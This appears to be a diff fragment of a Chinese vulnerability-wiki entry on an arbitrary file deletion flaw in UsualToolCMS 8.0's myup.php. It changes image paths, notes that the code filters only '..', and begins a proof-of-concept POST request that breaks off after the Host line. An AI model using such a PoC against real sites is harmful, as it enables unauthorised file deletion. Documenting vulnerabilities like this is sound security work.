@@ -16,13 +16,13 @@ UsualToolCMS-8.0-Release
 
 漏洞点：<http://0-sec.org/myup.php>
 
-![](/Users/aresx/Documents/VulWiki/.resource/UsualToolcms8.0myup.php前台任意文件删除/media/rId25.shtml)
+![](./.resource/UsualToolcms8.0myup.php前台任意文件删除/media/rId25.shtml)
 
 第47行只对..精心过滤，我仍然能任意删除网站内部的文件，直接构造poc，
 
-![](/Users/aresx/Documents/VulWiki/.resource/UsualToolcms8.0myup.php前台任意文件删除/media/rId26.shtml)
+![](./.resource/UsualToolcms8.0myup.php前台任意文件删除/media/rId26.shtml)
 
-![](/Users/aresx/Documents/VulWiki/.resource/UsualToolcms8.0myup.php前台任意文件删除/media/rId27.shtml)
+![](./.resource/UsualToolcms8.0myup.php前台任意文件删除/media/rId27.shtml)
 
     POST /UsualToolCMS/myup.php HTTP/1.1
     Host: 0-sec.org
